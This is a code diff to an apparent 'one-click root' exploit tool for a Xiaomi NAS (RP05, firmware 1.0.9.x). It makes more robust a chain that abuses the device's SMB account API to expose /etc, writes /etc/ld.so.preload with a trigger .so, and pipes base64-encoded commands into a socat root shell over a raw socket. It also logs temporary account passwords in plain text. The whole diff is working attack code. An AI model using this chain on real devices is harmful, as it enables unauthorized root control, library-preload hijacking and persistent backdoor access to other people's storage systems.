@@ -342,8 +342,12 @@ def ssh_key_path():
     p = os.path.expanduser("~/.ssh/id_ed25519_minas")
     os.makedirs(os.path.dirname(p), exist_ok=True)
     if not os.path.exists(p):
-        r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
-                           capture_output=True)
+        try:
+            r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
+                               capture_output=True)
+        except FileNotFoundError:
+            die("ssh-keygen 不可用：请安装/启用 OpenSSH 客户端后重跑"
+                "（或手动生成 ed25519 密钥对 %s 与 %s.pub）" % (p, p))
         if r.returncode != 0:
             die("ssh-keygen failed: %s" % r.stderr.decode(errors="replace"))
         log("ok", "generated new key %s" % p)
@@ -359,6 +363,66 @@ def tcp_open(ip, port, timeout=3):
         return False
 
 
+NET_USE_TRANSIENT = (53, 67, 121)  # BAD_NETPATH / BAD_NET_NAME / SEM_TIMEOUT：共享暂不可见，可重试
+
+
+def _net_use_mount(share, password, attempts=3, delay=5):
+    """net use 挂载共享，失败时把 rc 与原始输出带出来。此前挂载失败被无视，
+    随后的未认证 open 会以误导性的 errno（22/13）冒充真实原因（通常是 1219
+    多凭据冲突）。set 接口在 smb_mgr 内已同步完成 restart，共享本应立即可见；
+    53/67/121 视为时序残留短重试，1219/1326 等确定性失败立即报出。
+    挂载超时转为 OSError——TimeoutExpired 不是 OSError，直接穿透会让
+    main 的 except OSError 失效（口令不交代、清理不执行）。"""
+    uid = share.rsplit("-", 1)[-1]
+    result = None
+    for _ in range(attempts):
+        try:
+            result = subprocess.run(["net", "use", share, "/user:u" + uid, password],
+                                    capture_output=True, timeout=30)
+        except subprocess.TimeoutExpired as exc:
+            raise OSError("net use %s 超时（30s 无响应）：网络不通或服务器无响应" % share) from exc
+        if result.returncode == 0:
+            return result
+        if result.returncode not in NET_USE_TRANSIENT:
+            break
+        time.sleep(delay)
+    # subprocess.run 无 text=True：stderr/stdout 是 bytes，必须先拼接后整体解码
+    # （曾因 bytes+str 直接 TypeError，且不被调用方的 except OSError 捕获）。
+    detail = (result.stderr or b"") + b" " + (result.stdout or b"")
+    try:
+        detail = detail.decode("mbcs", "replace")  # Windows ANSI 代码页
+    except LookupError:  # 非 Windows（含测试模拟 os.name="nt"）无 mbcs 编码
+        detail = detail.decode("utf-8", "replace")
+    text = " ".join(detail.split())[:300]
+    hint = ""
+    if result.returncode == 1219:
+        hint = ("；同一 NAS 已存在其他凭据的会话（如已映射的网络盘 Z: 或桌面端占用）："
+                "先 net use 查看现有连接，net use <连接> /delete 断开后重跑")
+    raise OSError("net use %s 失败 (rc=%d): %s%s"
+                  % (share, result.returncode, text or "无输出", hint))
+
+
+def _net_use_delete(share):
+    """best-effort 断开 UNC 会话：收尾失败不能把 finally 之前的结果顶掉
+    （TimeoutExpired 不是 OSError，必须显式捕获）。残留会话由系统超时回收。"""
+    try:
+        subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+
+
+def _posix_unmount(mnt):
+    """best-effort 卸载并清理挂载点，任何收尾异常都吞掉（理由同 _net_use_delete）。"""
+    try:
+        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+    try:
+        os.rmdir(mnt)
+    except OSError:
+        pass
+
+
 def _smb_write_file(share, name, data, password):
     """经 root SMB 共享写文件（WebDAV 拒绝 /etc，实测 451）。Windows 用 net use 挂载；
     POSIX 挂 cifs 失败则报错让用户手动处理。幂等：重复挂载无妨。"""
@@ -372,22 +436,23 @@ def _smb_write_file(share, name, data, password):
         except OSError:
             pass
         # 未认证：挂载共享（用户 u<uid>，密码为步骤②创建共享时设置的）
-        uid = share.rsplit("-", 1)[-1]
-        subprocess.run(["net", "use", share, "/user:u" + uid, password],
-                       capture_output=True, timeout=30)
+        _net_use_mount(share, password)
         try:
             with open(path, "wb") as f:
                 f.write(data)
         finally:
-            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
+            _net_use_delete(share)
         return
     # POSIX: 尝试 cifs 挂载（多数发行版需 cifs-utils）
     import tempfile
     mnt = tempfile.mkdtemp()
     uid = share.rsplit("-", 1)[-1]
-    res = subprocess.run(["mount", "-t", "cifs", share, mnt,
-                          "-o", "username=u{},".format(uid) + "password=" + password],
-                         capture_output=True, timeout=30)
+    try:
+        res = subprocess.run(["mount", "-t", "cifs", share, mnt,
+                              "-o", "username=u{},".format(uid) + "password=" + password],
+                             capture_output=True, timeout=30)
+    except subprocess.TimeoutExpired as exc:
+        raise OSError("cifs mount 超时（30s 无响应）: %s (请手动挂载后重试)" % share) from exc
     if res.returncode != 0:
         raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
                       (res.stderr.decode(errors="replace")[:200], share))
@@ -395,8 +460,7 @@ def _smb_write_file(share, name, data, password):
         with open(os.path.join(mnt, name), "wb") as f:
             f.write(data)
     finally:
-        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
-        os.rmdir(mnt)
+        _posix_unmount(mnt)
 
 
 def _smb_read_file(share, name, password):
@@ -414,27 +478,26 @@ def _smb_read_file(share, name, password):
             return _read()
         except OSError:
             pass
-        uid = share.rsplit("-", 1)[-1]
-        mount = subprocess.run(["net", "use", share, "/user:u" + uid, password],
-                               capture_output=True, timeout=30)
+        _net_use_mount(share, password)
         try:
+            # 挂载成功后的 FileNotFoundError 才是可信的"文件不存在"
             try:
                 return _read()
             except FileNotFoundError:
-                if mount.returncode != 0:
-                    # 挂载未确认成功：文件"不存在"不可信（可能是未认证的假 404）
-                    raise OSError("cannot authenticate %s (net use rc=%d); "
-                                  "existence of %s unverified" % (share, mount.returncode, name))
                 return None
         finally:
-            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
+            _net_use_delete(share)
     # POSIX：mount rc!=0 直接抛错，成功挂载后的不存在才可信
     import tempfile
     mnt = tempfile.mkdtemp()
     uid = share.rsplit("-", 1)[-1]
-    res = subprocess.run(["mount", "-t", "cifs", share, mnt,
-                          "-o", "username=u{},".format(uid) + "password=" + password],
-                         capture_output=True, timeout=30)
+    try:
+        res = subprocess.run(["mount", "-t", "cifs", share, mnt,
+                              "-o", "username=u{},".format(uid) + "password=" + password],
+                             capture_output=True, timeout=30)
+    except subprocess.TimeoutExpired as exc:
+        os.rmdir(mnt)
+        raise OSError("cifs mount 超时（30s 无响应）: %s (请手动挂载后重试)" % share) from exc
     if res.returncode != 0:
         os.rmdir(mnt)
         raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
@@ -446,8 +509,7 @@ def _smb_read_file(share, name, password):
         except FileNotFoundError:
             return None
     finally:
-        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
-        os.rmdir(mnt)
+        _posix_unmount(mnt)
 
 
 class SmbSetupError(RuntimeError):
@@ -681,31 +743,38 @@ def _disarm_setup(uid, weird_name, smb_id, smb_password):
 
 def _cleanup_via_shell(args, disarm):
     """经 socat root shell 真正执行清理（成功与失败路径均调用）。
-    自身绝不抛异常（FileNotFoundError/TimeoutExpired 等一律捕获降级），失败降级链：
+    自身绝不抛异常（OSError/TimeoutExpired 等一律捕获降级），失败降级链：
     ① 写完整命令到本地 cleanup-<ip>.sh 并打印路径（用户可经 SMB 上传执行）
-    ② 打印完整手动命令（不截断）。"""
+    ② 打印完整手动命令（不截断）。
+    Windows 上不依赖 wsl/nc：直接对 shell 端口裸 socket 喂命令。"""
     try:
         if tcp_open(args.ip, args.shell_port, timeout=3):
-            import subprocess as sp
             b64 = base64.b64encode(disarm.encode()).decode()
             feed = "echo %s | base64 -d | bash" % b64
+            out = ""
             try:
-                if os.name == "nt":
-                    res = sp.run(["wsl", "bash", "-c",
-                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
-                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
-                                 errors="replace")
-                else:
-                    res = sp.run(["bash", "-c",
-                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
-                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
-                                 errors="replace")
-                if "CLEAN_OK" in (res.stdout or ""):
+                s = socket.create_connection((args.ip, args.shell_port), timeout=10)
+                try:
+                    s.settimeout(30)
+                    s.sendall((feed + "\nexit\n").encode())
+                    chunks = []
+                    while True:
+                        try:
+                            d = s.recv(65536)
+                        except socket.timeout:
+                            break
+                        if not d:
+                            break
+                        chunks.append(d)
+                    out = b"".join(chunks).decode("utf-8", "replace")
+                finally:
+                    s.close()
+                if "CLEAN_OK" in out:
                     log("ok", "清理完成（CLEAN_OK：清理命令各步骤全部成功）")
                     return
-                if "SMB_CLEAN_SKIP" in (res.stdout or ""):
+                if "SMB_CLEAN_SKIP" in out:
                     log("warn", "SMB 配置已变化或不再属于本次运行；保留账号和共享，跳过删除")
-            except (OSError, sp.TimeoutExpired) as exc:
+            except OSError as exc:
                 log("warn", "清理执行异常（%s），降级到手动方式" % type(exc).__name__)
         _dump_manual_cleanup(args, disarm)
     except Exception as exc:  # 清理自身绝不能成为崩溃点
@@ -760,12 +829,38 @@ def _die_smb_setup(args, nas, exc):
         "也可在小米 App/网页端的 SMB 账号管理中直接删除 u%s）" % (exc, args.ip, nas.uid))
 
 
+def _cleanup_leftover_account(nas):
+    """--cleanup：删除本 UID 遗留的临时 SMB 账号（无需 root、无需恢复出厂）。
+    只删 u<uid> 名下、共享路径恰为 /etc 的记录——这是本工具唯一的创建形态；
+    主账号等其他记录不匹配即跳过。固件 del_samba_account 会同步删除 pdbedit
+    账号、sambau<uid> 系统用户、uci 配置与共享并重启 smbd。"""
+    username = "u" + nas.uid
+    accounts = _smb_accounts(nas)
+    removed = []
+    for smb_id, entry in accounts.items():
+        if entry["username"] != username or entry["share_dir"] != ["/etc"]:
+            log("info", "ID=%s (%s → %s) 不属于本工具的临时共享，跳过"
+                % (smb_id, entry["username"], entry["share_dir"]))
+            continue
+        _smb_call(nas, "del_samba_account", {"id": int(smb_id)}, timeout=120)
+        removed.append(smb_id)
+        log("ok", "已删除临时 SMB 账号 %s（ID=%s，含注入共享与 samba%s 系统用户）"
+            % (username, smb_id, nas.uid))
+    if not removed:
+        log("ok", "没有找到 %s 名下共享路径为 /etc 的临时账号，无需清理" % username)
+    else:
+        log("ok", "清理完成；如 /pool0/data 下仍有首行为 30 个 M 的怪名暂存目录，"
+                  "可经 App 文件管理删除（名字见上次运行日志）")
+
+
 def main():
     ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
     ap.add_argument("ip")
     ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
     ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
     ap.add_argument("--shell-port", type=int, default=SHELL_PORT)
+    ap.add_argument("--cleanup", action="store_true",
+                    help="只删除本 UID 遗留的临时 SMB 账号（/etc 共享、口令无关），不尝试获取 root")
     args = ap.parse_args()
 
     log("step", "定位客户端证书")
@@ -778,6 +873,24 @@ def main():
     if args.uid:
         nas.uid = args.uid
     log("ok", "uid=%s sn=%s" % (nas.uid, nas.sn))
+
+    if args.cleanup:
+        log("step", "清理遗留临时 SMB 账号")
+        try:
+            _cleanup_leftover_account(nas)
+        except SmbSetupError as exc:
+            die(str(exc))
+        return
+
+    # ---------- 本地预检（在 NAS 端任何资源创建之前完成）----------
+    # keystone/ssh-keygen 缺失以前在步骤②之后才暴露：临时账号与注入共享已建成，
+    # die 不交代口令也不清理。提前到零失败态阶段，杜绝这一类裸奔路径。
+    keyp = ssh_key_path()
+    pubkey = open(keyp + ".pub").read().strip()
+    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
+    build_trigger_so(so_local)
+    log("ok", "预检通过：ssh 密钥就绪，触发 .so 已组装（%d bytes，keystone 可用）"
+        % os.path.getsize(so_local))
 
     # ---------- ① get WebDAV creds ----------
     log("step", "mTLS 获取 WebDAV 凭据 (get_pool_info)")
@@ -798,12 +911,6 @@ def main():
 
     # ---------- ③ preload trigger ----------
     log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
-    keyp = ssh_key_path()
-    pubkey = open(keyp + ".pub").read().strip()
-
-    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
-    build_trigger_so(so_local)
-    log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))
 
     # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
     # 固件 set_samba_account 会按新路径 /etc 把共享名改成 etc-<uid>。
@@ -814,6 +921,8 @@ def main():
     try:
         preload_orig = _smb_read_file(share, "ld.so.preload", smb_password)
     except OSError as exc:
+        log("warn", "本次临时账号 u%s 口令（排查/清理或经 App 管理该账号时需要）: %s"
+            % (nas.uid, smb_password))
         _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep"))
         die("read /etc/ld.so.preload failed: %s（原状未确认，不覆盖布防）" % exc)
     bak_name = None
@@ -824,6 +933,7 @@ def main():
             if _smb_read_file(share, bak_name, smb_password) != preload_orig:
                 raise OSError("备份读回内容与原文件不一致")
         except OSError as exc:
+            log("warn", "本次临时账号 u%s 口令: %s" % (nas.uid, smb_password))
             _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep", bak_name))
             die("备份原 /etc/ld.so.preload 失败: %s（原文件未动，中止布防）" % exc)
         log("ok", "原 ld.so.preload 非空（%d bytes），已备份为 /etc/%s；触发与清理将恢复原文件"
@@ -838,12 +948,14 @@ def main():
         log("ok", "payload + .so written to /etc (SMB root share)")
     except OSError as exc:
         # 中途失败：共享已建，必须清理后再 die（此阶段 preload 未布防，keep 模式不触碰）
+        log("warn", "本次临时账号 u%s 口令: %s" % (nas.uid, smb_password))
         _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep", bak_name))
         die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
             % (share, exc, share, nas.uid, smb_password))
     try:
         _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
     except OSError as exc:
+        log("warn", "本次临时账号 u%s 口令: %s" % (nas.uid, smb_password))
         _cleanup_via_shell(args, disarm_armed)
         die("arm ld.so.preload failed: %s" % exc)
     log("ok", "ld.so.preload armed — waiting for cron (≤75s)")
